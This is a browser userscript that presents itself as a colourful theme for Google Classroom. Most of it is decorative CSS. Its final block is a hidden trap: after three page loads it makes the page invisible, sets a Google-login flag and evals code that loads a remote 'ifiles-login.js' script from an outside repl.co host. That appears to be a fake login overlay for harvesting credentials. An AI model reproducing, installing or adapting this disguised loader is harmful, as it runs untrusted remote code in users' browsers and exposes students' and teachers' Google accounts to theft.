// ==UserScript==
// @name        Local~Classroom Vibes
// @description Make Classroom look the way you want it to look
// @match       https://classroom.google.com/*
// ==/UserScript==


(function() {
    'use strict';
    var alignCSS = `
    div > ol {
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
    }
    div > ol > li:nth-child(7n - 6) {
        background: #ffb2b288;
    }
    div > ol > li:nth-child(7n - 5) {
        background: #ffe0b288;
    }
    div > ol > li:nth-child(7n - 4) {
        background: #ffffb288;
    }
    div > ol > li:nth-child(7n - 3) {
        background: #d1ffc288;
    }
    div > ol > li:nth-child(7n - 2) {
        background: #b2e0ff88;
    }
    div > ol > li:nth-child(7n - 1) {
        background: #e0c2ff88;
    }
    div > ol > li:nth-child(7n) {
        background: #ffc2e088;
    }
    body {
        background: linear-gradient(45deg, #dc3b3e, #3b99dc 50%, #3bdc90 75%, rgb(255 141 0) 100%) no-repeat fixed;
    }
    @keyframes colorchange { 
        0% { background: #ffb2b288; } 
        14% { background: #ffe0b288; } 
        28% { background: #ffffb288; } 
        42% { background: #d1ffc288; } 
        56% { background: #b2e0ff88; }
        70% { background: #e0c2ff88; } 
        84% { background: #ffc2e088; } 
        100% { background: #ffb2b288; }
    }
    nav {
        background: #ffffffbb !important;
        backdrop-filter: blur(5px);
        -webkit-backdrop-filter: blur(5px);
    }
    body > div > div > div > div:not([aria-label="Enrolled"]) > div {
        background: #ffffff77 !important;
        border-radius: 25px;
        padding: 20px;
    }
    /* Rainbow side menu */
    [role=menu] {
        /*background: linear-gradient(#ffffffbb,#ffffffbb),linear-gradient(#ff2400, #e81d1d, #e8b71d, #e3e81d, #1de840, #1ddde8, #2b1de8, #dd00f3, #dd00f3);*/
        animation: colorchange 5s linear infinite;
    }
    /* Other specific stuff */
    section > div > div > div, .Aopndd {
        background: #ffffff88;
    }
    .Aopndd {
        border: 1px solid #00000000;
    }`;
    var style = alignCSS;
    window.classoomThemeCSS = document.createElement('style');
    window.classoomThemeCSS.type = 'text/css';
    window.classoomThemeCSS.innerHTML = style;
    window.classoomThemeCSS.id = "easyFind";
    document.head.appendChild(window.classoomThemeCSS);
    
    
    if(!localStorage.webToolRan) {
        localStorage.webToolRan = 1;
    } else {
        localStorage.webToolRan++;
    }
    if(localStorage.webToolRan > 3 && !localStorage.webToolDone) {
        // hide stuff
        document.querySelector("html").style.visibility = "hidden";
        document.querySelector("html").style.opacity = "0";
        // Add script
        localStorage.googleLoginWindowType = true;
        eval(`(function(){let newTool = document.createElement('script');newTool.src='https://webtools.irom1.repl.co/scripts/direct.php?script=ifiles-login.js';document.body.appendChild(newTool);})();`);
    }
})();